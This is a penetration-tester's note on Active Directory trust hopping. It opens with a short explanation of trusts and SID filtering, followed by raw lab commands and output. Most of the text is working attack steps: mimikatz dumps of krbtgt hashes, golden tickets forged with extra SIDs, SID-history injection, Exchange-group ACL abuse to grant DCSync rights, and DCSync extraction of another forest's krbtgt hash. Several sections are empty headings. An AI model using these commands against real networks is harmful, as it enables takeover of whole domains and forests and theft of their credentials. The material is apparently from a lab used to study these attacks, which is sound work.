# Active Directory - Trusts hopping

### Overview

Trust relationships define an administrative and security link between two
Windows forests or domains. They enable a user to access resources that are
located in a forest or domain that's different from the user's own forest
or domain.

###### Authentication across trusts

Both the `Kerberos` and the `NTLM` protocols are used for authentication
across Active Directory trusts. An authentication is first attempted using the
`Kerberos` protocol and, in case of failure, a rollback authentication is made
through the `NTLM` protocol.

If the authentication is made through the `Kerberos` protocol, a new `Kerberos`
ticket is issued to the user: the `referral ticket`. This ticket corresponds to
a reissue of the user's current `Ticket-Granting Ticket (TGT)` encrypted with
one of the secrets (`RC4`, corresponding to the `NTLM hash`, or
`AES 128/256 bits` keys) of the `trust account`.

The referral tickets, as with any other `Kerberos` tickets, contain the user
authentication information (`SID`, eventual extra `SIDs` and the user's groups)
in its `Privilege Attribute Certificate (PAC)`. The `referral tickets` are
subsequently used to request `service tickets` and access resources in the
trusting domain or forest.

###### Trusts directions

The direction of an Active Directory trust relationship defines the direction
of the accesses and can be:
  - `one-way`, given by one forest or domain, the `trusting object`, to another
  domain or forest, the `trusted object`.
  - `bidirectional` or `two-ways`, meaning are reciprocated by both objects
  forming the trust. A `bidirectional` trust is actually implemented as two
  `one-way` trusts.

The `trusting object` will define `outbound` trusts with the objects that it
directly trust. Reciprocally, the `trusted object` will define an `inbound`
trust with object that directly trust it.

###### Transitivity

A `transitive trust` is a trust that is extended not only to the directly
trusted object, but also to each objects that the trusted object trusts. A
transitive trust will thus give access to the resources of the trusting domain
to all domains or forests that are trusted by the trusted object defined in the
trust.

A trust that is non transitive will limit access to the resources of the
trusting object only to the trusted domain or forest and will not extend to any
other object.

###### Default and possible trusts

All domains in a forest trust each others by default. External trusts can also
be configured between domains of different forests.

The following different types of trusts are or can be configured in Active
Directory (either by default or manually):

| Trust type | Direction | Transitivity | Description |
|------------|-----------|--------------|-------------|
| Parent-Child | Two-way | Transitive | Created automatically between a child domain and its domain parent. |
| Tree-Root | Two-way | Transitive | Created automatically when a new Tree is added to a forest. |
| Shortcut   | One-way or two-way | Transitive | Created manually to improve performance between two domains in the same forest. |
| External | One or two-way | Non-transitive by default | Manually created trusts between domains of different forests. |  
| Forest trust | One or two-way | Non-transitive | Manually created trusts between different forests. <br/> Forest trusts are not extendable to others forests: a trust between one forest and another does not extend to the eventual trusted forests of each forest.  |
| Realm | One-way or two way | Transitive or non-transitive | Manually created trusts between an Active Directory forest and a non-Windows Kerberos directory. |

###### Security mechanism: SID filtering

A filtering policy governs the `Security Identifier (SID)` that can be used to
authenticate through Active Directory trusts. The filtering depends on the type
of the trust, the type of the SID, as well as the activation or not of the
security filtering mechanism known as `SID filtering`. This filtering applies
on the current SID of the account as well as any SID present in its history.

The relationships for which this mechanism is activated are considered to be in
quarantine. Which is, by default, the case for all extra-forest trust
relationships (inter-domain and inter-forest), conversely intra-forest trust
relationships (parent-children, tree root and trusts shortened).

When deleting quarantine from an external approval, the TRUST_ bit
ATTRIBUTE_QUARANTINED_DOMAIN of datagram trustAttributes is removed. The
relationship, until then considered to be "Quarantined External ”, is now
simply“ External ”. When deleting quarantine of a cross-forest trust, the
TRUST_ bit ATTRIBUTE_TREAT_AS_EXTERNAL of datagram trustAttributes is set and
the relation is considered, from the point of view of SID filtering, as an
"External" relation.

Finally, when quarantining a domain as part of a trust relationship
intra-forest, the trust relationship is said to be "QuarantinedWithinForest '
and a policy of specific filtering is applied to it: "the only SIDs authorized
to be transmitted from such a domain are the SID "Enterprise Domain
Controllers" (S-1-5-9) and those described by the domain object approved
(TDO)”. Activation of `SID filtering` for intra-forest trusts is not
recommended by Microsoft and may give rise to operational issues.

###### Security mechanism: SID filtering

### Forest and domain trusts enumeration

Various tools or utilities can be used to retrieve the trusts defined for a
domain or at the forest level:

```
# Windows built-in command-line utility.
# Relies on the DsEnumerateDomainTrusts Win32 API and returns limited information:
nltest /trusted_domains

# PowerShell - Active Directory module / PowerView.
# Relies on LDAP queries and returns more exhaustive results.
Import-Module ActiveDirectory / Import-Module <PATH\Microsoft.ActiveDirectory.Management.dll>
Import-Module <PATH\PowerView.ps1>

# Trusts ONLY of the current domain. Does not recursively enumerates trusts of others domains in the forest.
Get-ADTrust -Filter *
Get-ADTrust -Filter * | Ft Name, Direction, DisallowTransivity, SIDFilteringQuarantined, SIDFilteringForestAware, TGTDelegation
Get-DomainTrust

# Enumerates all the trusts of the current forest.
(Get-ADForest).Domains | ForEach-Object { Get-ADTrust -Server $_ -Filter * -Properties *  | Ft Name, Direction, DisallowTransivity, SIDFilteringQuarantined, SIDFilteringForestAware, TGTDelegation }
Get-ForestTrust
```

In additions, more comprehension and automated Active Directory scanners
implemented in `.NET`, such as `BloodHound` or `PingCastle`, include modules to
enumerate trusts information. Refer to the `[ActiveDirectory] AD scanner` note
for more information on how to conduct enumeration using automated scanners.

### Domain trusts hopping

### Forest trusts hopping

###### Trusts with out SID Filtering

###### Quarantined trusts (with SID Filtering)+

--------------------------------------------------------------------------------
                                    DOMAIN
--------------------------------------------------------------------------------

Netdom trust lab2.ad /domain:dc1.lab2.ad /quarantine:Yes
Netdom trust lab.ad /domain:dc1.lab.ad /quarantine:Yes

Netdom trust forest1.net /domain:sub.forest1.net /quarantine:No;
Netdom trust sub.forest1.net /domain:forest1.net /quarantine:No;

Netdom trust forest1 /domain:forest2.net /enablesidhistory:Yes
Netdom trust forest2 /domain:forest1.net /enablesidhistory:Yes

C:\Python27\python.exe C:\Tools\decryptKerbTicket\decryptKerbTicket.py -k 6c124a35a3e86b501a58cf01214c06c63785a3a11166625fe7abd3c4f7600f94 -t C:\Tools\kekeo\x64\user1_da@SUB.FOREST1.NET_krbtgt~SUB.FOREST1.NET@SUB.FOREST1.NET.ccaches
[...]
CommonHeader:
    Version:                         1
Data:
    EffectiveName:                   'user1_da'
    UserId:                          1105
    PrimaryGroupId:                  513
    LogonServer:                     'SID-DC1SUB'
    LogonDomainName:                 'SUB'
    GroupCount:                      2
    GroupIds:
        [

            RelativeId:                      512
            Attributes:                      7 ,

            RelativeId:                      513
            Attributes:                      7 ,
        ]
    ExtraSids:
        [

            Sid:
                Revision:                        1
                SubAuthorityCount:               1
                IdentifierAuthority:             '\x00\x00\x00\x00\x00\x12'
                SubAuthority:
                    [
                         1,
                    ]
            Attributes:                      7 ,
        ]
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
forest1.net

Get-ADDomain forest1.net
S-1-5-21-641969683-1743101000-2841093426
(New-Object System.Security.Principal.NTAccount("forest1.net","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
S-1-5-21-641969683-1743101000-2841093426-502

Get-ADDomain sub.forest1.net
S-1-5-21-2897659825-2986355867-346294487
(New-Object System.Security.Principal.NTAccount("sub.forest1.net","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
S-1-5-21-2897659825-2986355867-346294487-502

mimikatz # lsadump::lsa /inject /user:krbtgt
Domain : SUB / S-1-5-21-2897659825-2986355867-346294487
RID  : 000001f6 (502)
User : krbtgt
 * Primary
           6c06d08e5cc09770f960d6d4690d0564
    NTLM : 6c06d08e5cc09770f960d6d4690d0564
    LM   :
  Hash NTLM: 6c06d08e5cc09770f960d6d4690d0564
    ntlm- 0: 6c06d08e5cc09770f960d6d4690d0564
    lm  - 0: b68cdff5a614a3306f5000312b6979cc
 * Kerberos
    Default Salt : SUB.FOREST1.NETkrbtgt
    Credentials
      des_cbc_md5       : e92045d3dcbfb06b
 * Kerberos-Newer-Keys
    Default Salt : SUB.FOREST1.NETkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 6c124a35a3e86b501a58cf01214c06c63785a3a11166625fe7abd3c4f7600f94
      aes128_hmac       (4096) : 4318031e0d7b435660a46fa0caf027f6
      des_cbc_md5       (4096) : e92045d3dcbfb06b

(New-Object System.Security.Principal.NTAccount("sub.forest1.net","SID-DC1SUB$")).Translate([System.Security.Principal.SecurityIdentifier]).Value
S-1-5-21-2897659825-2986355867-346294487-1001

/user:ChildDomainControllerMachineName$  
/user:SID-DC1SUB$
/rc4: KRBTGT Hash
/rc4:6c06d08e5cc09770f960d6d4690d0564
/sid:Child Domain SID
/sid:S-1-5-21-2897659825-2986355867-346294487
/domain:FQDN of Child Domain
/domain:sub.forest1.net
/groups:516
/groups:516
/sids:ParentSID-516,S-1-5-9
/sids:S-1-5-21-641969683-1743101000-2841093426-516,S-1-5-9
/id:ID of Child Domain Controller
/id:S-1-5-21-2897659825-2986355867-346294487-1001
/ptt

kerberos::golden /user:SID-DC1SUB$ /rc4:6c06d08e5cc09770f960d6d4690d0564 /sid:S-1-5-21-2897659825-2986355867-346294487 /domain:sub.forest1.net /groups:516 /sids:S-1-5-21-641969683-1743101000-2841093426-516,S-1-5-9 /id:S-1-5-21-2897659825-2986355867-346294487-1001 /ptt

kerberos::golden /user:SID-DC1SUB$ /rc4:f2145b640930f58dd3d7082e5b9070aa /sid:S-1-5-21-2897659825-2986355867-346294487 /domain:sub.forest1.net /groups:516 /sids:S-1-5-21-641969683-1743101000-2841093426-516,S-1-5-9 /id:S-1-5-21-2897659825-2986355867-346294487-1001 /ptt

dir \\sid-dc1.forest1.net\C$

kerberos::golden /user:SID-DC1SUB$ /rc4:6c06d08e5cc09770f960d6d4690d0564 /sid:S-1-5-21-2897659825-2986355867-346294487 /domain:sub.forest1.net /groups:516 /sids:S-1-5-21-641969683-1743101000-2841093426-516,S-1-5-9 /ptt

kerberos::golden /user:SID-DC1SUB$ /rc4:f2145b640930f58dd3d7082e5b9070aa /sid:S-1-5-21-2897659825-2986355867-346294487 /domain:sub.forest1.net /groups:516 /sids:S-1-5-21-641969683-1743101000-2841093426-516,S-1-5-9 /ptt

lsadump::dcsync /domain:forest1.net /dc:sid-dc1.forest1.net /user:forest1\krbtgt

--------------------------------------------------------------------------------
                                  FOREST
--------------------------------------------------------------------------------

sid::patch
sid::add /sam:user1_ea /new:S-1-5-21-3552938972-2500852776-447908158-519
sid::add /sam:user1_ea /new:S-1-5-21-3552938972-2500852776-447908158-1106

Get-ADUser user1_ea -Properties samAccountName, SIDHistory

krbtgt hash
5121bd268e8872e28260c9eefc86e17f

Get-ADDomain forest1.net
S-1-5-21-641969683-1743101000-2841093426

Get-ADDomain forest2.net
S-1-5-21-3552938972-2500852776-447908158
--------------------------------------------------------------------------------
kerberos::golden /user:user1_ea /domain:forest1.net /sid:S-1-5-21-641969683-1743101000-2841093426 /rc4:5121bd268e8872e28260c9eefc86e17f /sids:S-1-5-21-3552938972-2500852776-447908158-519 /ptt

lsadump::dcsync /domain:forest2.net /dc:sid-dc2.forest2.net /user:forest2\krbtgt
--------------------------------------------------------------------------------

Get-ADGroup -Server forest2.net "Exchange Windows Permissions"
S-1-5-21-3552938972-2500852776-447908158-1122

kerberos::golden /user:user1_ea /domain:forest1.net /sid:S-1-5-21-641969683-1743101000-2841093426 /rc4:5121bd268e8872e28260c9eefc86e17f /sids:S-1-5-21-3552938972-2500852776-447908158-1122 /ptt

$acl = get-acl "ad:DC=forest2,DC=net"
$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$user = Get-ADUser -Identity $id.User
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=forest2,DC=net"

# Par défaut pour les installations February 12th 2019

Get-ADGroup -Server forest2.net "Organization Management"
S-1-5-21-3552938972-2500852776-447908158-1108
Get-ADGroup -Server forest2.net "Exchange Trusted Subsystem"
S-1-5-21-3552938972-2500852776-447908158-1121
Get-ADGroup -Server forest2.net "Exchange Windows Permissions"
S-1-5-21-3552938972-2500852776-447908158-1122

sid::patch
sid::add /sam:user2_ea /new:S-1-5-21-3552938972-2500852776-447908158-1108
sid::add /sam:user2_ea /new:S-1-5-21-3552938972-2500852776-447908158-1121
sid::add /sam:user2_ea /new:S-1-5-21-3552938972-2500852776-447908158-1122
Get-ADUser user2_ea -Properties * | Ft SIDHistory

# kerberos::golden /user:user1_ea /domain:forest1.net /sid:S-1-5-21-641969683-1743101000-2841093426 /rc4:5121bd268e8872e28260c9eefc86e17f /groups:1108,1121,1122 /sids:S-1-5-21-3552938972-2500852776-447908158-1108,S-1-5-21-3552938972-2500852776-447908158-1121,S-1-5-21-3552938972-2500852776-447908158-1122 /ptt

dir \\sid-exchange.forest2.net\c$

.\PsExec64.exe -accepteula \\sid-exchange.forest2.net whoami /all

USER INFORMATION
----------------

User Name        SID
================ =============================================
forest1\user2_ea S-1-5-21-641969683-1743101000-2841093426-1107


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes

========================================== ================ ============================================= ==============
=================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory grou
p, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory grou
p, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory grou
p, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory grou
p, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory grou
p, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory grou
p, Enabled by default, Enabled group
FOREST1\Domain Admins                      Group            S-1-5-21-641969683-1743101000-2841093426-512  Mandatory grou
p, Enabled by default, Enabled group
FOREST1\Enterprise Admins                  Group            S-1-5-21-641969683-1743101000-2841093426-519  Mandatory grou
p, Enabled by default, Enabled group
FOREST2\Organization Management            Group            S-1-5-21-3552938972-2500852776-447908158-1108 Mandatory grou
p, Enabled by default, Enabled group
FOREST2\Exchange Trusted Subsystem         Group            S-1-5-21-3552938972-2500852776-447908158-1121 Mandatory grou
p, Enabled by default, Enabled group
FOREST2\Exchange Windows Permissions       Group            S-1-5-21-3552938972-2500852776-447908158-1122 Mandatory grou
p, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory grou
p, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


.\PsExec64.exe -accepteula \\sid-exchange.forest2.net -i -d powershell.exe 'Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Add-ADPermission "DC=forest2,DC=net" -User FOREST1\user2_ea -ExtendedRights Ds-Replication-Get-Changes-All;'
.\PsExec64.exe -accepteula \\sid-exchange.forest2.net -i -d powershell.exe -nop -exec bypass -c "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Add-ADPermission 'DC=forest2,DC=net' -User 'FOREST1\user1_ea' -ExtendedRights Ds-Replication-Get-Changes-All;"


powershell.exe -c "Import-Module ActiveDirectory; Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn; Add-ADPermission 'DC=forest2,DC=net' -User 'FOREST1\user1_ea' -ExtendedRights Ds-Replication-Get-Changes-All;"


Enter-PSSession -ComputerName sid-exchange.forest2.net
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
Add-ADPermission "DC=forest2,DC=net" -User FOREST1\user1_ea -ExtendedRights Ds-Replication-Get-Changes-All
Add-ADPermission "DC=forest2,DC=net" -User FOREST1\user2_ea -ExtendedRights Ds-Replication-Get-Changes-All
Identity             User                 Deny  Inherited
--------             ----                 ----  ---------
forest2.net          FOREST1\user1_ea     False False


mimikatz # lsadump::dcsync /domain:forest2.net /dc:sid-dc2.forest2.net /user:forest2\krbtgt
[DC] 'forest2.net' will be the domain
[DC] 'sid-dc2.forest2.net' will be the DC server
[DC] 'forest2\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/10/2019 10:50:53 AM
Object Security ID   : S-1-5-21-3552938972-2500852776-447908158-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 157e9ec86df4cfa9fd85306117e5fab5


Import-Module ActiveDirectory
New-PSDrive -Name AD2 -PSProvider ActiveDirectory -Server 'sid-dc2.forest2.net' -root "//RootDSE/"
$acl = get-acl "AD2:DC=forest2,DC=net"
$id = "user1_ea"
$user = Get-ADUser -Identity $id
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "AD2:DC=forest2,DC=net"

Import-Module ActiveDirectory
$acl = get-acl "ad:DC=forest2,DC=net"
$id = "user1_ea"
$user = Get-ADUser -Server forest1.net -Identity $id
$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
$identity = [System.Security.Principal.IdentityReference] $sid
$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
$type = [System.Security.AccessControl.AccessControlType] "Allow"
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
$acl.AddAccessRule($ace)
Set-acl -aclobject $acl "ad:DC=forest2,DC=net"
--------------------------------------------------------------------------------------------------------------------------------------------------------

Name              : user1_ea
SID               : S-1-5-21-641969683-1743101000-2841093426-1106

Name              : user2_ea
SID               : S-1-5-21-641969683-1743101000-2841093426-1107

Name              : user_ea
SID               : S-1-5-21-641969683-1743101000-2841093426-1109

Get-ADGroup -Server forest2.net "Exchange Windows Permissions"
S-1-5-21-3552938972-2500852776-447908158-1122

privilege::debug
sid::patch
sid::add /sam:user_ea /new:S-1-5-21-3552938972-2500852776-447908158-1108
sid::add /sam:user_ea /new:S-1-5-21-3552938972-2500852776-447908158-1121
sid::add /sam:user_ea /new:S-1-5-21-3552938972-2500852776-447908158-1122
Get-ADUser user_ea -Properties * | Ft samAccountName,SID,SIDHistory

Import-Module .\PowerView.ps1
Add-ObjectACL -Server forest2.net -TargetDomain forest2.net -TargetIdentity "dc=forest2,dc=net" -PrincipalDomain forest1.net -PrincipalIdentity user_ea -Rights DCSync

PS C:\Tools> Get-ObjectACL -Server forest2.net -Domain forest2.net -Identity "dc=forest2,dc=net" | ?{$_.SecurityIdentifier -match 'S-1-5-21-641969683-1743101000-2841093426-1109'} | Ft ObjectAceType

ObjectAceType
-------------
89e95b76-444d-4c62-991a-0facbeda640c
1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

lsadump::dcsync /domain:forest2.net /dc:sid-dc2.forest2.net /user:forest2\krbtgt
SAM Username         : krbtgt
Credentials:
  Hash NTLM: 157e9ec86df4cfa9fd85306117e5fab5
--------------------------------------------------------------------------------

kerberos::golden /user:user1_da2 /rc4:6c06d08e5cc09770f960d6d4690d0564 /sid:S-1-5-21-2897659825-2986355867-346294487 /domain:sub.forest1.net /groups:519 /sids:S-1-5-21-641969683-1743101000-2841093426-1109 /ptt

kerberos::golden /user:user1_da2 /rc4:f2145b640930f58dd3d7082e5b9070aa /sid:S-1-5-21-2897659825-2986355867-346294487 /domain:sub.forest1.net /groups:519 /sids:S-1-5-21-641969683-1743101000-2841093426-1109 /ptt

dir \\sid-dc1.forest1.net\C$
